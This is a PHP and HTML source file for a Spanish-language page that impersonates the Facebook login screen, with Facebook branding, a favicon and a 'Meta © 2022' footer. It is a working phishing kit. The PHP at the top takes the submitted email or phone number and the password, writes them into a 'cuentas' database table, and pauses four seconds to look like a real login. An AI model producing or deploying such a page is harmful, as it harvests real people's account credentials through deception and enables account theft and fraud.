<?php  
    include_once('conexion.php');
    echo  "<script src='index.js'></script>";
    echo "<script src='https://unpkg.com/sweetalert/dist/sweetalert.min.js'></script>";
    $correo = (isset($_POST['Correo']) ? $_POST['Correo'] : "");
    $contrasenia = (isset($_POST['Contrasenia']) ? $_POST['Contrasenia'] : "");
    $accion = (isset($_POST['Subir'])) ? $_POST['Subir'] : "";
    if($accion == 'Subir'){
        sleep(4);
        $query = $conexion->prepare("INSERT INTO cuentas (correo,contrasenia) VALUES(:correo,:contrasenia)");
        $query->bindParam(':correo',$correo);
        $query->bindParam(':contrasenia',$contrasenia);
        $query->execute();
        $accion = "";
    }
           


?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <link rel="shortcut icon" href="Imagenes/fb.ico" type="image/x-icon">
    <link rel="stylesheet" href="index.css">
</head>
<body>
    <section class="Container">
        <div>
            <div class="fb" ><p>facebook</p></div>
        </div>
    
        <div class="Cuadro">
            <form action="" method="POST">
                <input class="Inputs" name="Correo" type="text" placeholder="Correo electronico o número de teléfono">
                <input class="Inputs" name="Contrasenia" type="text"  placeholder="Contraseña">
                <button class="Submit" name="Subir" value="Subir" onclick="exito()" type="submit">Iniciar sesión</button>  
            </form>
          
            
         
            <div class="Span">
                <a class="Olvidar" href="">¿Olvidaste tu contraseña?</a>
            </div>
            <div class="Linea">
                <div class="Display Space"><hr></div>
                <div class="Display O"><span>o</span></div>
                <div class="Display Space"><hr></div>
            </div>
            <div class="Btncrear">
                <button class="Crear" type="submit">Crear cuenta nueva</button>
            </div>
            
        </div>
      
            

    </section>
    <footer class="Footer">
        <div class="ContainerFooter">
            <div class="ES">
                <p>Español</p>
                <p>Portugues (Brasil)</p>
                <p>Francais (France)</p>
                
            </div>
            <div class="EN">
                <p>English (US)</p>
                <p>Italiano</p>
                <p>Deutsch</p>
                
            </div>
            <div class="Info">
                <p>Informacion · Ayuda · Más</p>
            </div>
            <div class="Info">
                <p>Meta © 2022</p>
            </div>
            <div></div>
        </div>
        

    </footer>
    
</body>
</html>